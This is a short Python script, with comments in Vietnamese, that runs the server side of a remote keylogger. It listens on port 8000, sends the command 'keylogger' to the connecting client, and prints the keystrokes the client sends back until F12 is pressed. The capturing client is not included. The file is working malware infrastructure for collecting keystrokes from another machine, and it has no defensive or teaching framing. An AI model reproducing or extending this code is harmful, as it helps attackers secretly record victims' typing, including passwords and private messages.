import socket
import threading

# port = 8000
port = 8000
serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serverSocket.bind(('', port))
serverSocket.listen(5)

clientSocket, clientAddress = serverSocket.accept()
print('Got connection from', clientAddress)


clientSocket.send('keylogger'.encode())

while True:
    data = clientSocket.recv(1024)
    if not data:
        break
    data = data.decode('utf-8')
    data = data.replace("'b'", "")
    data = data.replace("'", "")
    
    if data == "Key.backspace":
        data = "back"
    elif data == "Key.f12":
        break
    else:
        if data == "Key.shift":
            data = ""
        if data == "Key.ctrl_l":
            data = ""
        if data == "Key.alt_l":
            data = ""
        if data == "Key.tab":
            data = "\t"
        if data == "Key.enter":
            data = "\n"
        if data == "Key.space":
            data = "_"
    print(data, end="")

# Đóng socket client sau khi hoàn thành công việc
clientSocket.close()

# Đóng socket server khi kết thúc chương trình
serverSocket.close()
